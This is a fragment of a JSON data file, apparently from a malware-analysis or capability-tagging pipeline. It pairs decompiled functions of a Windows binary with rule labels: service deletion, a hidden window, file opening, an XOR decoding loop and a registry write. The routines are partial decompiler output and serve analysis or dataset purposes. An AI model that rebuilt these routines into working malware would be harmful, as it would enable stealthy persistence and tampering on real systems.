        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004010a2) overlaps instruction at (ram,0x004010a1)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401090(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t unaff_EBX;\n    \n    *(unaff_EBX + 0x4d8b0c45) = *(unaff_EBX + 0x4d8b0c45) | 8;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n    if (iVar1 != 0) {\n        uVar2 = (*_sym.imp.ADVAPI32.dll_DeleteService)();\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 204
    },
    "00401890": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401890(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x410410, 0x420934, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    return 1;\n}\n",
        "token_count": 137
    },
    "00403d70": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403d70(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 64
    },
    "00402e70": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402ea8) overlaps instruction at (ram,0x00402ea3)\n// \n\nvoid __cdecl fcn.00402e70(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    \n    uVar2 = 0;\n    uVar1 = arg_14h;\n    if (arg_14h != 0) {\n        do {\n            bVar3 = (POPCOUNT(uVar1 & 0xff) & 1U) != 0;\n            if ((bVar3) && (!bVar3)) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            *(uVar2 + arg_10h) = *(uVar2 + arg_10h) ^ *(uVar2 % arg_ch + arg_8h);\n            uVar2 = uVar2 + 1;\n            uVar1 = uVar2 - arg_14h;\n        } while (uVar2 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 280
    },
    "00404250": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00404250(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x420608, 0x42064c, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 78
    }
}